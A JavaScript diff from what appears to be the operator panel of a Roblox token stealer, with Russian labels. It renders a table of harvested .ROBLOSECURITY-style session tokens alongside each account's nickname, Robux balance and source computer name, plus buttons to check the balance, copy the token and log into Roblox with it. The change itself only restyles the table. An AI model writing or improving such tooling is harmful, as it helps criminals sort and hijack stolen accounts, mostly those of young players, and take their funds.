@@ -52,48 +52,38 @@ function renderTokens() {
     list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
   }
 
-  let html = '<table class="tokens-table"><thead><tr>';
-  html += '<th>Статус</th>';
-  html += '<th>Ник</th>';
-  html += '<th>Robux</th>';
-  html += '<th>Токен</th>';
-  html += '<th>Компьютер</th>';
-  html += '<th>Действия</th>';
-  html += '</tr></thead><tbody>';
+  let html = '<table class="tokens-table" style="border-spacing: 0 8px;"><thead><tr><th>Статус</th><th>Ник</th><th>Robux</th><th>Токен</th><th>Компьютер</th><th>Действия</th></tr></thead><tbody>';
 
   for (const t of list) {
-    const valid = t.valid;
-    const robux = valid && t.robux !== null ? t.robux : null;
-    const rowClass = valid ? '' : 'invalid';
-    const statusBadge = valid
-      ? '<span class="badge badge-valid">✅ Рабочий</span>'
-      : '<span class="badge badge-invalid">❌ ' + escapeHtml(t.error || 'Невалид') + '</span>';
-    const robuxDisplay = valid
-      ? '<span class="robux">' + (robux !== null ? robux.toLocaleString() + ' R$' : '?') + '</span>'
-      : '<span class="robux invalid">—</span>';
-    const nick = escapeHtml(t.username || t.user || '—');
-    const computer = escapeHtml(t.computer || '—');
-    const tokenShort = t.security ? escapeHtml(t.security.substring(0, 30)) + '...' : '—';
+    const badgeClass = t.valid ? 'badge-valid' : 'badge-invalid';
+    const statusText = t.valid ? '✅ Рабочий' : '❌ ' + (t.error || 'Невалид');
+    const tokenSnippet = t.security ? escapeHtml(t.security.substring(0, 20)) + '...' : '—';
     const tokenFull = escapeHtml(t.security || '');
     const fileId = escapeHtml(t.file || '');
 
-    html += '<tr class="' + rowClass + '" id="row-' + fileId + '">';
-    html += '<td>' + statusBadge + '</td>';
-    html += '<td style="font-weight:600;">' + nick + '</td>';
-    html += '<td>' + robuxDisplay + '</td>';
-    html += '<td><div class="token-cell" title="' + tokenFull + '">' + tokenShort + '</div></td>';
-    html += '<td style="font-size:0.78rem;">' + computer + '</td>';
-    html += '<td><div style="display:flex; gap:6px; flex-wrap:wrap;">';
-    html += '<button class="copy-btn" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem;">💰 Проверить</button>';
+    html += '<tr>';
+    html += '<td style="border-left: 1px solid var(--border); border-top-left-radius: var(--radius-lg); border-bottom-left-radius: var(--radius-lg);"><span class="badge ' + badgeClass + '">' + statusText + '</span></td>';
+    html += '<td><strong>' + escapeHtml(t.username || '—') + '</strong></td>';
+    
+    const rbxText = t.valid && t.robux !== undefined ? t.robux.toLocaleString() + ' R$' : '—';
+    const rbxColor = t.valid && t.robux > 0 ? '#fbbf24' : 'var(--text-muted)';
+    const rbxGlow = t.valid && t.robux > 0 ? 'text-shadow: 0 0 15px rgba(251, 191, 36, 0.5); font-weight: 800;' : 'font-weight: 600;';
+    html += '<td><span style="color: ' + rbxColor + '; ' + rbxGlow + ' font-size: 1.1rem;">' + rbxText + '</span></td>';
+    
+    html += '<td><div class="token-cell">' + tokenSnippet + '</div></td>';
+    html += '<td><div style="font-size: 0.85rem; color: var(--text-secondary);"><span style="margin-right: 5px;">💻</span>' + escapeHtml(t.computer || '—') + '</div></td>';
+    html += '<td style="border-right: 1px solid var(--border); border-top-right-radius: var(--radius-lg); border-bottom-right-radius: var(--radius-lg);"><div style="display:flex; gap:0.5rem; flex-wrap:wrap;">';
+    
+    html += '<button class="copy-btn" onclick="checkSingle(\'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.75rem; padding: 0.4rem 0.8rem; background:rgba(245,158,11,0.1); color:var(--warning); border:1px solid rgba(245,158,11,0.25); border-radius: 6px; transition: all 0.2s;">💰 Проверить</button>';
     if (t.security) {
-      html += '<button class="copy-btn" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem;">📋 Копировать</button>';
+      html += '<button class="copy-btn" onclick="copyText(\'' + tokenFull.replace(/'/g, "\\'") + '\')" style="font-size:0.75rem; padding: 0.4rem 0.8rem; border-radius: 6px; transition: all 0.2s;">📋 Копировать</button>';
       let loginBtnText = '👤 Войти';
       const lastLogin = localStorage.getItem('login_' + fileId);
       if (lastLogin) {
         const d = new Date(parseInt(lastLogin));
         loginBtnText = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
       }
-      html += '<button class="copy-btn" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.72rem; background:rgba(34,197,94,0.12); color:#22c55e; border:1px solid rgba(34,197,94,0.15);">' + loginBtnText + '</button>';
+      html += '<button class="copy-btn" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')" style="font-size:0.75rem; padding: 0.4rem 0.8rem; background:rgba(16,185,129,0.1); color:var(--success); border:1px solid rgba(16,185,129,0.25); border-radius: 6px; transition: all 0.2s; box-shadow: 0 0 10px rgba(16,185,129,0.1);">' + loginBtnText + '</button>';
     }
     html += '</div></td>';
     html += '</tr>';
